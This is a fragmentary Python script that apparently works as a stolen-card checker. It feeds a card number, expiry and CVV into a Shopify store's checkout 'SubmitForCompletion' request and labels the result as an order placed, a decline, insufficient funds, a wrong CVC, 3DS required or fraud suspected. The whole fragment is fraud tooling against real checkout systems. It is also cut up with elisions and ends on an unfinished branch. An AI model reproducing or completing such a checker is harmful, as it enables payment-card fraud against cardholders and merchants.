...
async def get_variant_and_token(collection_url, cc_number, cc_month, cc_year, cc_cvv):
    ...
    'operationName': 'SubmitForCompletion',
        ...
        # Check if there's a receipt in the response
        response_json = request.json()
        submit_for_completion = response_json.get('data', {}).get('submitForCompletion', {})
        
        # Check for errors first
        errors = submit_for_completion.get('errors', [])
        if errors:
        ...
        # If no errors, check for receipt
        ...
        if "shopify_payments" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: ORDER_PLACED"
        elif "CARD_DECLINED" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: CARD_DECLINED"
        elif "INCORRECT_NUMBER" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: INCORRECT_NUMBER"
        elif "GENERIC_ERROR" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: GENERIC_ERROR"
        elif "AUTHENTICATION_FAILED" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: 3DS_REQUIRED"
        elif "FRAUD_SUSPECTED" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: FRAUD_SUSPECTED"
        elif "INCORRECT_ADDRESS" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: MISMATCHED_BILLING"
        elif "INCORRECT_ZIP" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: MISMATCHED_ZIP"
        elif "INCORRECT_PIN" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: MISMATCHED_PIN"
        elif "insufficient_funds" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: INSUFFICIENT_FUNDS"
        elif "INSUFFICIENT_FUNDS" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: INSUFFICIENT_FUNDS"
        elif "INVALID_CVC" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: INVALID_CVC"
        elif "INCORRECT_CVC" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: INCORRECT_CVC"
        if "CompletePaymentChallenge" in str(response_json):
            return f"AMOUNT: {sym}{amount}\nRESULT: 3DS_REQUIRED"
        else:
